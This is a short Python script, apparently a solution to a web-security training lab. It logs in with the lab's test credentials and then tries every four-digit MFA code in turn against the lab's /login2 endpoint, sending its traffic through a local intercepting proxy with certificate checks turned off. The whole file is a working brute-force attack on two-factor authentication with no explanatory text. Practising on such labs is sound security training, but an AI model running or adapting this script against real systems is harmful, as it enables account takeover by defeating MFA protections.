import requests
import urllib3 



# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

for jester in range(1111,9999):
    login_session = requests.Session()
    url = "https://0a18007c03b2aaff80f5dfbd004b0090.web-security-academy.net/"
    login_data = {"username":"wiener","password":"peter"}
    login_response = login_session.post(url+"/login",verify=False,proxies=proxies,data=login_data)
    mfa_data = {"mfa-code":jester}
    response2 = login_session.post(url+"/login2",verify=False,proxies=proxies,data=mfa_data)


